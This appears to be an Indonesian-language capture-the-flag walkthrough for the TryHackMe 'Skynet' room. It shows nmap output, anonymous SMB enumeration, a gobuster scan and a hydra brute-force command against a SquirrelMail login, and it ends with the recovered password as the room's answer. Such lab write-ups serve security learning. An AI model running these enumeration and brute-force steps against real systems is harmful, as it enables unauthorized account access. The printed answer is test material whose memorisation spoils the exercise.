# CTF Skynet
- TryHackMe Room: https://tryhackme.com/room/skynet
- IP Machine: 10.10.66.97

## Nmap Report
- Lakukan scanning dengan tool nmap menggunakan perintah: `nmap -sV -A <IP Machine>`

```sh
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -A 10.10.66.97
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-06 21:53 EDT
Nmap scan report for 10.10.66.97
Host is up (0.23s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 992331bbb1e943b756944cb9e82146c5 (RSA)
|   256 57c07502712d193183dbe4fe679668cf (ECDSA)
|_  256 46fa4efc10a54f5757d06d54f6c34dfe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: TOP PIPELINING UIDL SASL AUTH-RESP-CODE CAPA RESP-CODES
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: listed capabilities have post-login more Pre-login LOGINDISABLEDA0001 SASL-IR OK LOGIN-REFERRALS IDLE ID ENABLE IMAP4rev1 LITERAL+
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2023-09-07T02:03:36
|_  start_date: N/A
|_clock-skew: mean: 1h40m02s, deviation: 2h53m12s, median: 1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2023-09-06T21:03:36-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 627.49 seconds
```

### Enumerasi SMB
- Gunakan perintah `smbclient -L <IP Machine>` untuk membuka list shares. Disini ditemukan user **anonymous** dan **milesdyson** pada SMB Server

- Buka file sharing dari user **anonymous** dengan perintah `smbclient //<IP Machine>/anonymous` lalu tekan enter jika dimintai password. Jika sudah terhubung, ketik `ls` untuk melihat list file dan directory


- Download file attention.txt dengan perntah `get attention.txt`

- Navigasi ke folder `logs`, disana terdapat 3 buah file log. Download semua file dengan perintah `mget *` dan ketik **y** untuk setiap konfirmasi. Selanjutnya keluar dari SMB Client dengan perintah `quit`

- Berikut ini adalah isi file **attention.txt**

- File **log1.txt** ternyata berisi wordlists yang digunakan untuk melakukan brute force

### Gobuster Report
- Baris perintah: `gobuster dir -u http://<IP Machine> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`

- Ditemukan halaman **/squirrelmail** dari report gobuster. Buka halaman `http://<IP_Machine>/squirrelmail` di browser, maka langsung diarahkan ke halaman login squirrelmail

### Exploit
- Lakukan Inspek Element lalu pindah tab **Network** dan lakukan percobaan login

- Brute force akun user **milesdyson** dengan tool hydra dengan perintah `hydra -l milesdyson -P log1.txt <IP Machine> http-form-post '/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown User or password incorrect.'`





- **Pertanyaan:** What is Miles password for his emails?
```sh
cyborg007haloterminator
```
